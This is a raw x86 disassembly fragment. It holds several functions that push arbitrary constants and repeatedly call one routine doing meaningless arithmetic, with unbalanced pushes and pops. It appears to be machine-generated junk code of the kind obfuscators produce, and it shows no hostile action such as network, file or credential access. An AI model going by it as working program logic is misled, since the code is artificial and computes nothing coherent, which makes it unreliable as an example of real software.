  41c0db:	xor    DWORD PTR [ebp-0x44],edx
  41c0de:	mov    ecx,DWORD PTR [ebp-0x20]
  41c0e1:	mov    esi,edi
  41c0e3:	add    ebx,edx
  41c0e5:	sub    DWORD PTR [ebp-0x44],ecx
  41c0e8:	add    ebx,esi
  41c0ea:	and    DWORD PTR [ebp-0x20],ebx
  41c0ed:	pop    esi
  41c0ee:	mov    DWORD PTR [ebp-0x44],ecx
  41c0f1:	pop    ebx
  41c0f2:	mov    edx,0xf
  41c0f7:	cmp    esi,eax
  41c0f9:	jne    0x41c135
  41c0fb:	mov    ecx,0x25
  41c100:	cmp    eax,ecx
  41c102:	jne    0x41c135
  41c104:	add    edx,eax
  41c106:	and    ecx,edx
  41c108:	test   ebx,0xb4
  41c10e:	jne    0x41c135
  41c110:	add    DWORD PTR [ebp-0x20],ebx
  41c113:	mov    edx,ecx
  41c115:	xor    DWORD PTR [ebp-0x44],esi
  41c118:	add    edx,eax
  41c11a:	xor    DWORD PTR [ebp-0x20],ecx
  41c11d:	and    edx,ecx
  41c11f:	mov    ecx,DWORD PTR [ebp-0x44]
  41c122:	add    DWORD PTR [ebp-0x44],ecx
  41c125:	sub    edx,esi
  41c127:	add    edx,edi
  41c129:	add    DWORD PTR [ebp-0x20],esi
  41c12c:	cmp    edx,esi
  41c12e:	je     0x41c135
  41c130:	and    edx,ecx
  41c132:	and    DWORD PTR [ebp-0x44],edx
  41c135:	leave  
  41c136:	ret    
  41c137:	int3   
  41c138:	int3   
  41c139:	int3   
  41c13a:	int3   
  41c13b:	int3   
  41c13c:	push   ebp
  41c13d:	mov    ebp,esp
  41c13f:	sub    esp,0x38
  41c142:	mov    eax,0xc715
  41c147:	push   0x4d569100
  41c14c:	push   eax
  41c14d:	call   0x41c72f
  41c152:	add    esp,0x8
  41c155:	push   ebx
  41c156:	call   0x41c72f
  41c15b:	push   esi
  41c15c:	push   0x2
  41c15e:	push   0xa9c27500
  41c163:	call   0x41c72f
  41c168:	add    esp,0x8
  41c16b:	push   eax
  41c16c:	push   0xffffffd6
  41c16e:	push   0x15694500
  41c173:	call   0x41c72f
  41c178:	add    esp,0xc
  41c17b:	push   edi
  41c17c:	push   0xffffffb4
  41c17e:	push   eax
  41c17f:	push   0xffffff99
  41c181:	push   0xffffffc7
  41c183:	call   0x41c72f
  41c188:	add    esp,0x10
  41c18b:	call   0x41c72f
  41c190:	mov    DWORD PTR [ebp-0x1c],eax
  41c193:	push   eax
  41c194:	push   eax
  41c195:	call   0x41c72f
  41c19a:	add    esp,0x8
  41c19d:	push   0xffffffee
  41c19f:	call   0x41c72f
  41c1a4:	add    esp,0x4
  41c1a7:	push   eax
  41c1a8:	push   eax
  41c1a9:	call   0x41c72f
  41c1ae:	add    esp,0x8
  41c1b1:	push   eax
  41c1b2:	push   0xffffffb4
  41c1b4:	call   0x41c72f
  41c1b9:	add    esp,0x8
  41c1bc:	pop    edi
  41c1bd:	add    eax,eax
  41c1bf:	mov    edx,0xa9dc
  41c1c4:	sub    DWORD PTR [ebp-0x1c],edx
  41c1c7:	push   0x60
  41c1c9:	push   0x17
  41c1cb:	push   0x355e8800
  41c1d0:	call   0x41c72f
  41c1d5:	add    esp,0xc
  41c1d8:	pop    esi
  41c1d9:	push   0x59a83500
  41c1de:	push   edi
  41c1df:	call   0x41c72f
  41c1e4:	add    esp,0x8
  41c1e7:	push   edi
  41c1e8:	push   0x52
  41c1ea:	push   esi
  41c1eb:	push   0xffffffd5
  41c1ed:	call   0x41c72f
  41c1f2:	add    esp,0x10
  41c1f5:	pop    ebx
  41c1f6:	xor    edx,edx
  41c1f8:	mov    ecx,DWORD PTR [ebp-0x1c]
  41c1fb:	push   edi
  41c1fc:	push   ecx
  41c1fd:	push   0xffffff9e
  41c1ff:	push   ebx
  41c200:	call   0x41c72f
  41c205:	add    esp,0x10
  41c208:	leave  
  41c209:	ret    
  41c20a:	int3   
  41c20b:	int3   
  41c20c:	int3   
  41c20d:	int3   
  41c20e:	int3   
  41c20f:	push   ebp
  41c210:	mov    ebp,esp
  41c212:	sub    esp,0x18
  41c215:	push   0xfffffff5
  41c217:	push   0x31
  41c219:	push   0x359b9d00
  41c21e:	push   0x31ea7700
  41c223:	push   0xffffffca
  41c225:	call   0x41c72f
  41c22a:	add    esp,0x14
  41c22d:	push   ebx
  41c22e:	push   0x59ce9500
  41c233:	push   eax
  41c234:	push   0x99ea7a00
  41c239:	push   0x45c4de00
  41c23e:	push   0x2
  41c240:	call   0x41c72f
  41c245:	add    esp,0x14
  41c248:	push   esi
  41c249:	push   eax
  41c24a:	call   0x41c72f
  41c24f:	add    esp,0x4
  41c252:	push   edi
  41c253:	push   eax
  41c254:	call   0x41c72f
  41c259:	add    esp,0x4
  41c25c:	push   0x67
  41c25e:	push   eax
  41c25f:	push   0x69
  41c261:	push   0xb51ba900
  41c266:	call   0x41c72f
  41c26b:	add    esp,0x10
  41c26e:	call   0x41c72f
  41c273:	add    eax,eax
  41c275:	push   0xffffffca
  41c277:	call   0x41c72f
  41c27c:	add    esp,0x4
  41c27f:	push   0x15
  41c281:	push   0x30
  41c283:	call   0x41c72f
  41c288:	add    esp,0x8
  41c28b:	cmp    eax,0x157e
  41c290:	jne    0x41c2a3
  41c292:	mov    eax,0xd2
  41c297:	add    eax,eax
  41c299:	push   0x16
  41c29b:	call   0x41c72f
  41c2a0:	add    esp,0x4
  41c2a3:	push   eax
  41c2a4:	push   eax
  41c2a5:	call   0x41c72f
  41c2aa:	add    esp,0x8
  41c2ad:	push   0xffffff93
  41c2af:	push   0xf75f8100
  41c2b4:	call   0x41c72f
  41c2b9:	add    esp,0x8
  41c2bc:	pop    edi
  41c2bd:	cmp    edi,0xffffffe2
  41c2c0:	je     0x41c2e7
  41c2c2:	test   edi,0xb7
  41c2c8:	jne    0x41c2e7
  41c2ca:	cmp    eax,DWORD PTR [ebp-0x10]
  41c2cd:	jne    0x41c2e7
  41c2cf:	add    eax,edi
  41c2d1:	mov    ecx,0xb6
  41c2d6:	push   0xffffffec
  41c2d8:	push   0xd7587300
  41c2dd:	push   0x6d
  41c2df:	call   0x41c72f
  41c2e4:	add    esp,0xc
  41c2e7:	push   0xd753f500
  41c2ec:	push   eax
  41c2ed:	push   0xffffffa8
  41c2ef:	push   0x49
  41c2f1:	push   eax
  41c2f2:	call   0x41c72f
  41c2f7:	add    esp,0x14
  41c2fa:	pop    esi
  41c2fb:	push   0xffffffc5
  41c2fd:	call   0x41c72f
  41c302:	add    esp,0x4
  41c305:	pop    ebx
  41c306:	push   0xffffffec
  41c308:	push   0x39
  41c30a:	push   0x0
  41c30c:	push   esi
  41c30d:	push   0x1e
  41c30f:	call   0x41c72f
  41c314:	add    esp,0x14
  41c317:	push   0x34
  41c319:	push   0x51e5d300
  41c31e:	push   edi
  41c31f:	push   ebx
  41c320:	push   esi
  41c321:	call   0x41c72f
  41c326:	add    esp,0x14
  41c329:	leave  
  41c32a:	ret    
  41c32b:	int3   
  41c32c:	int3   
  41c32d:	int3   
  41c32e:	int3   
  41c32f:	int3   
  41c330:	push   ebp
  41c331:	mov    ebp,esp
  41c333:	sub    esp,0x38
  41c336:	push   0x76
  41c338:	push   0xffffffaa
  41c33a:	call   0x41c72f
  41c33f:	add    esp,0x8
  41c342:	push   0x15
  41c344:	push   0xd5d08200
  41c349:	push   0xf9834c00
  41c34e:	push   0x67
  41c350:	push   0x87520f00
  41c355:	call   0x41c72f
  41c35a:	add    esp,0x14
  41c35d:	push   ebx
  41c35e:	mov    DWORD PTR [ebp-0x2c],eax
  41c361:	push   0x6b
  41c363:	push   eax
  41c364:	push   eax
  41c365:	push   eax
  41c366:	call   0x41c72f
  41c36b:	add    esp,0x10
  41c36e:	push   esi
  41c36f:	push   0xe
  41c371:	push   0x1500cd00
  41c376:	call   0x41c72f
  41c37b:	add    esp,0x8
  41c37e:	push   edi
  41c37f:	cmp    eax,0x3a
  41c382:	jne    0x41c3a2
  41c384:	push   0xd0a5a00
  41c389:	push   0xd5c3f800
  41c38e:	push   0x59c96b00
  41c393:	push   0x69
  41c395:	push   0xd729e00
  41c39a:	call   0x41c72f
  41c39f:	add    esp,0x14
  41c3a2:	push   eax
  41c3a3:	push   0xffffff8a
  41c3a5:	push   0x5a
  41c3a7:	push   eax
  41c3a8:	call   0x41c72f
  41c3ad:	add    esp,0x10
  41c3b0:	mov    esi,DWORD PTR [ebp-0x2c]
  41c3b3:	test   esi,0x88
  41c3b9:	jne    0x41c3f9
  41c3bb:	mov    edi,eax
  41c3bd:	push   0x1de3af00
  41c3c2:	push   esi
  41c3c3:	push   0xb533de00
  41c3c8:	call   0x41c72f
  41c3cd:	add    esp,0xc
  41c3d0:	add    edi,esi
  41c3d2:	push   0x4a
  41c3d4:	push   eax
  41c3d5:	call   0x41c72f
  41c3da:	add    esp,0x8
  41c3dd:	push   0x55e91a00
  41c3e2:	push   0x3d
  41c3e4:	push   0x75e10000
  41c3e9:	push   0xfd942900
  41c3ee:	call   0x41c72f
  41c3f3:	add    esp,0x10
  41c3f6:	add    DWORD PTR [ebp-0x2c],edi
  41c3f9:	push   eax
  41c3fa:	push   eax
  41c3fb:	call   0x41c72f
  41c400:	add    esp,0x8
  41c403:	push   0xfffffffb
  41c405:	push   0x1570fc00
  41c40a:	push   0x3527fd00
  41c40f:	push   eax
  41c410:	push   0xffffffca
  41c412:	call   0x41c72f
  41c417:	add    esp,0x14
  41c41a:	push   eax
  41c41b:	push   0xc5df5a00
  41c420:	push   0xffffffc0
  41c422:	push   0xffffffb2
  41c424:	call   0x41c72f
  41c429:	add    esp,0x10
  41c42c:	push   0xf767f700
  41c431:	push   0x85a87600
  41c436:	push   0x674a2000
  41c43b:	push   edi
  41c43c:	push   0xa767e000
  41c441:	call   0x41c72f
  41c446:	add    esp,0x14
  41c449:	mov    ecx,0x29
  41c44e:	push   0x17
  41c450:	push   ecx
  41c451:	push   0x32
  41c453:	push   esi
  41c454:	call   0x41c72f
  41c459:	add    esp,0x10
  41c45c:	pop    edi
  41c45d:	push   edi
  41c45e:	push   0xffffffb2
  41c460:	call   0x41c72f
  41c465:	add    esp,0x8
  41c468:	pop    esi
  41c469:	or     eax,edi
  41c46b:	push   0x475dfc00
  41c470:	push   eax
  41c471:	call   0x41c72f
  41c476:	add    esp,0x8
  41c479:	push   0xffffff93
  41c47b:	push   0xffffffe7
  41c47d:	push   esi
  41c47e:	push   0x91ac6300
  41c483:	push   esi
  41c484:	call   0x41c72f
  41c489:	add    esp,0x14
  41c48c:	pop    ebx
  41c48d:	mov    ecx,0xb9
  41c492:	xor    eax,eax
  41c494:	push   0x6726be00
  41c499:	push   0x8d3e6e00
  41c49e:	push   esi
  41c49f:	push   ecx
  41c4a0:	push   0xe9b55900
  41c4a5:	call   0x41c72f
  41c4aa:	add    esp,0x14
  41c4ad:	push   0x4d75c200
  41c4b2:	push   ebx
  41c4b3:	push   0x72
  41c4b5:	call   0x41c72f
  41c4ba:	add    esp,0xc
  41c4bd:	leave  
  41c4be:	ret    
  41c4bf:	int3   
  41c4c0:	int3   
  41c4c1:	int3   
  41c4c2:	int3   
  41c4c3:	int3   
  41c4c4:	push   ebp
  41c4c5:	mov    ebp,esp
  41c4c7:	sub    esp,0x2c
  41c4ca:	mov    ecx,0x1
  41c4cf:	push   0x4a
  41c4d1:	push   ecx
  41c4d2:	call   0x41c72f
  41c4d7:	add    esp,0x8
  41c4da:	push   ebx
  41c4db:	mov    ecx,0x40
  41c4e0:	call   0x41c72f
  41c4e5:	push   esi
  41c4e6:	add    eax,eax
  41c4e8:	push   0xffffff89
  41c4ea:	push   0x2a
  41c4ec:	push   eax
  41c4ed:	push   eax
  41c4ee:	call   0x41c72f
  41c4f3:	add    esp,0x10
  41c4f6:	call   0x41c72f
  41c4fb:	push   edi
  41c4fc:	test   eax,0x27
  41c501:	je     0x41c527
  41c503:	xor    edi,edi
  41c505:	call   0x41c72f
  41c50a:	xor    eax,eax
  41c50c:	push   0xb1ec7a00
  41c511:	push   eax
  41c512:	push   0x157a3c00
  41c517:	call   0x41c72f
  41c51c:	add    esp,0xc
  41c51f:	call   0x41c72f
  41c524:	mov    DWORD PTR [ebp-0x10],edi
  41c527:	push   0xffffff9c
  41c529:	push   0xcd6a0300
  41c52e:	push   0xc74b3b00
  41c533:	push   0xffffffed
  41c535:	push   0x35271b00
  41c53a:	call   0x41c72f
  41c53f:	add    esp,0x14
  41c542:	mov    DWORD PTR [ebp-0x20],eax
  41c545:	push   0xe1cc5c00
  41c54a:	push   0xffffffdd
  41c54c:	push   eax
  41c54d:	call   0x41c72f
  41c552:	add    esp,0xc
  41c555:	and    edi,eax
  41c557:	push   0xffffff8e
  41c559:	call   0x41c72f
  41c55e:	add    esp,0x4
  41c561:	push   edi
  41c562:	push   0xffffff93
  41c564:	push   0xffffffc6
  41c566:	push   0x5d
  41c568:	push   0x52
  41c56a:	call   0x41c72f
  41c56f:	add    esp,0x14
  41c572:	sub    DWORD PTR [ebp-0x20],eax
  41c575:	push   eax
  41c576:	push   0xffffffc5
  41c578:	push   eax
  41c579:	push   0x35672400
  41c57e:	call   0x41c72f
  41c583:	add    esp,0x10
  41c586:	pop    edi
  41c587:	mov    edx,DWORD PTR ds:0x4240a0
  41c58d:	cmp    edi,0xffffffed
  41c590:	jne    0x41c59f
  41c592:	push   0x64
  41c594:	push   0x66
  41c596:	push   eax
  41c597:	call   0x41c72f
  41c59c:	add    esp,0xc
  41c59f:	pop    esi
  41c5a0:	sub    DWORD PTR [ebp-0x20],esi
  41c5a3:	pop    ebx
  41c5a4:	mov    edx,DWORD PTR [ebp-0x20]
  41c5a7:	mov    ecx,DWORD PTR [ebp-0x20]
  41c5aa:	push   0x150fba00
  41c5af:	push   ecx
  41c5b0:	push   ecx
  41c5b1:	push   0xc9eb3200
  41c5b6:	call   0x41c72f
  41c5bb:	add    esp,0x10
  41c5be:	leave  
  41c5bf:	ret    
  41c5c0:	int3   
  41c5c1:	int3   
  41c5c2:	int3   
  41c5c3:	int3   
  41c5c4:	int3   
  41c5c5:	push   ebp
  41c5c6:	mov    ebp,esp
  41c5c8:	sub    esp,0x30
  41c5cb:	mov    edx,0x11
  41c5d0:	mov    eax,edx
  41c5d2:	push   eax
  41c5d3:	call   0x41c72f
  41c5d8:	add    esp,0x4
  41c5db:	push   ebx
  41c5dc:	test   eax,0x51
  41c5e1:	jne    0x41c5e6
  41c5e3:	mov    DWORD PTR [ebp-0x1c],eax
  41c5e6:	push   esi
  41c5e7:	mov    eax,0x1180250a
  41c5ec:	mov    ecx,eax
  41c5ee:	push   ecx
  41c5ef:	push   0xdde47800
  41c5f4:	push   0x35cbc700
  41c5f9:	push   0xf5bc9400
  41c5fe:	push   0xf9879000
  41c603:	call   0x41c72f
  41c608:	add    esp,0x14
  41c60b:	push   0x97619600
  41c610:	call   0x41c72f
  41c615:	add    esp,0x4
  41c618:	push   edi
  41c619:	mov    eax,0x5504040
  41c61e:	mov    ecx,0x76
  41c623:	push   ecx
  41c624:	push   0x36
  41c626:	push   ecx
  41c627:	call   0x41c72f
  41c62c:	add    esp,0xc
  41c62f:	push   eax
  41c630:	push   0xffffffb7
  41c632:	push   0x60
  41c634:	push   eax
  41c635:	push   0xf766d400
  41c63a:	call   0x41c72f
  41c63f:	add    esp,0x14
  41c642:	mov    edx,DWORD PTR ds:0x42406c
  41c648:	push   edx
  41c649:	push   0x27564800
  41c64e:	call   0x41c72f
  41c653:	add    esp,0x8
  41c656:	push   eax
  41c657:	push   0xffffffee
  41c659:	push   0x9d8d7e00
  41c65e:	push   eax
  41c65f:	call   0x41c72f
  41c664:	add    esp,0x10
  41c667:	cmp    eax,DWORD PTR ds:0x42406c
  41c66d:	je     0x41c674
  41c66f:	call   0x41c72f
  41c674:	push   0xffffffa1
  41c676:	push   0xffffffbb
  41c678:	push   0xcd32af00
  41c67d:	push   0xd9c9f300
  41c682:	push   eax
  41c683:	call   0x41c72f
  41c688:	add    esp,0x14
  41c68b:	call   0x41c72f
  41c690:	push   0x36
  41c692:	push   0x54
  41c694:	push   0xa722bb00
  41c699:	push   0x5739ed00
  41c69e:	call   0x41c72f
  41c6a3:	add    esp,0x10
  41c6a6:	push   eax
  41c6a7:	push   0x35d6b900
  41c6ac:	push   0x4d781500
  41c6b1:	push   eax
  41c6b2:	push   0x5a
  41c6b4:	call   0x41c72f
  41c6b9:	add    esp,0x14
  41c6bc:	push   0x34
  41c6be:	push   0x4d1b4800
  41c6c3:	push   eax
  41c6c4:	call   0x41c72f
  41c6c9:	add    esp,0xc
  41c6cc:	pop    edi
  41c6cd:	add    eax,edi
  41c6cf:	push   eax
  41c6d0:	push   edi
  41c6d1:	push   0x61ee4200
  41c6d6:	call   0x41c72f
  41c6db:	add    esp,0xc
  41c6de:	push   eax
  41c6df:	push   edi
  41c6e0:	push   0xfffffffa
  41c6e2:	push   0x2a
  41c6e4:	push   0x73
  41c6e6:	call   0x41c72f
  41c6eb:	add    esp,0x14
  41c6ee:	pop    esi
  41c6ef:	mov    ebx,0xd7cf
  41c6f4:	test   esi,0xad
  41c6fa:	jne    0x41c717
  41c6fc:	mov    edx,ebx
  41c6fe:	mov    eax,0xba
  41c703:	push   esi
  41c704:	push   0x77d7e00
  41c709:	push   ebx
  41c70a:	push   0x8d18d600
  41c70f:	call   0x41c72f
  41c714:	add    esp,0x10
  41c717:	pop    ebx
  41c718:	mov    edx,0x35
  41c71d:	push   edx
  41c71e:	push   0x6d
  41c720:	call   0x41c72f
  41c725:	add    esp,0x8
  41c728:	leave  
  41c729:	ret    
  41c72a:	int3   
  41c72b:	int3   
  41c72c:	int3   
  41c72d:	int3   
  41c72e:	int3   
  41c72f:	push   ebp
  41c730:	mov    ebp,esp
  41c732:	sub    esp,0x40
  41c735:	mov    ecx,0x35
  41c73a:	mov    DWORD PTR [ebp-0x10],ecx
  41c73d:	push   ebx
  41c73e:	mov    ecx,DWORD PTR [ebp-0x10]
  41c741:	mov    edx,0xce31
  41c746:	add    DWORD PTR [ebp-0x10],ecx
  41c749:	cmp    ecx,0x1c
  41c74c:	je     0x41c753
  41c74e:	mov    ebx,ecx
  41c750:	sub    DWORD PTR [ebp-0x10],ebx
  41c753:	add    DWORD PTR [ebp-0x10],edx
  41c756:	push   esi
  41c757:	sub    DWORD PTR [ebp-0x10],ecx
  41c75a:	push   edi
  41c75b:	cmp    ebx,0xb
  41c75e:	jne    0x41c779
  41c760:	mov    edx,DWORD PTR [ebp-0x10]
  41c763:	sub    edx,ecx
  41c765:	mov    ebx,DWORD PTR [ebp-0x10]
  41c768:	cmp    edx,0xffffffe9
  41c76b:	jne    0x41c779
  41c76d:	add    ebx,edx
  41c76f:	sub    ebx,edx
  41c771:	mov    edx,DWORD PTR [ebp-0x10]
  41c774:	sub    ebx,edx
  41c776:	and    DWORD PTR [ebp-0x10],ebx
  41c779:	mov    esi,DWORD PTR [ebp-0x10]
  41c77c:	add    esi,ecx
  41c77e:	mov    ecx,0x68
  41c783:	and    esi,ebx
  41c785:	add    ecx,esi
  41c787:	mov    DWORD PTR [ebp-0x10],ecx
  41c78a:	cmp    edx,DWORD PTR [ebp-0x18]
  41c78d:	je     0x41c7b6
  41c78f:	mov    edi,DWORD PTR ds:0x424068
  41c795:	mov    eax,DWORD PTR [ebp-0x10]
  41c798:	sub    DWORD PTR [ebp-0x10],eax
  41c79b:	cmp    edx,DWORD PTR [ebp-0x40]
  41c79e:	jne    0x41c7b6
  41c7a0:	add    DWORD PTR [ebp-0x10],esi
  41c7a3:	sub    edi,ecx
  41c7a5:	and    edi,ecx
  41c7a7:	sub    edi,ebx
  41c7a9:	mov    edx,ebx
  41c7ab:	mov    ebx,eax
  41c7ad:	or     DWORD PTR [ebp-0x10],ebx
  41c7b0:	sub    DWORD PTR [ebp-0x10],edx
  41c7b3:	add    DWORD PTR [ebp-0x10],edi
  41c7b6:	xor    edx,edx
  41c7b8:	mov    ebx,0xca
  41c7bd:	and    edx,ebx
  41c7bf:	and    DWORD PTR [ebp-0x10],edx
  41c7c2:	pop    edi
  41c7c3:	add    DWORD PTR [ebp-0x10],edi
  41c7c6:	pop    esi
  41c7c7:	mov    edx,ebx
  41c7c9:	sub    DWORD PTR [ebp-0x10],eax
  41c7cc:	mov    eax,0xb9
  41c7d1:	add    eax,esi
  41c7d3:	cmp    eax,DWORD PTR ds:0x424068
  41c7d9:	je     0x41c845
  41c7db:	xor    ecx,ecx
  41c7dd:	add    DWORD PTR [ebp-0x10],ecx
  41c7e0:	test   eax,0xf
  41c7e5:	jne    0x41c845
  41c7e7:	add    DWORD PTR [ebp-0x10],edx
  41c7ea:	mov    ecx,DWORD PTR [ebp-0x10]
  41c7ed:	cmp    eax,edi
  41c7ef:	jne    0x41c845
  41c7f1:	add    eax,edx
  41c7f3:	cmp    eax,ebx
  41c7f5:	je     0x41c845
  41c7f7:	mov    edx,DWORD PTR ds:0x424068
  41c7fd:	mov    edx,ecx
  41c7ff:	add    DWORD PTR [ebp-0x10],edx
  41c802:	cmp    edx,DWORD PTR ds:0x424068
  41c808:	je     0x41c845
  41c80a:	sub    DWORD PTR [ebp-0x10],esi
  41c80d:	add    eax,eax
  41c80f:	cmp    eax,0x79
  41c812:	je     0x41c845
  41c814:	mov    edx,0x68
  41c819:	mov    ecx,DWORD PTR [ebp-0x10]
  41c81c:	add    DWORD PTR [ebp-0x10],ecx
  41c81f:	cmp    eax,0xecf3
  41c824:	jne    0x41c845
  41c826:	sub    DWORD PTR [ebp-0x10],eax
  41c829:	or     DWORD PTR [ebp-0x10],esi
  41c82c:	and    edx,edi
  41c82e:	cmp    edx,DWORD PTR ds:0x424068
  41c834:	je     0x41c845
  41c836:	add    edx,edx
  41c838:	add    edx,eax
  41c83a:	mov    ebx,DWORD PTR [ebp-0x10]
  41c83d:	add    edx,edi
  41c83f:	sub    DWORD PTR [ebp-0x10],edx
  41c842:	sub    DWORD PTR [ebp-0x10],ebx
  41c845:	pop    ebx
  41c846:	cmp    ebx,DWORD PTR ds:0x424068
  41c84c:	je     0x41c851
  41c84e:	xor    DWORD PTR [ebp-0x10],ebx
  41c851:	leave  
  41c852:	ret    
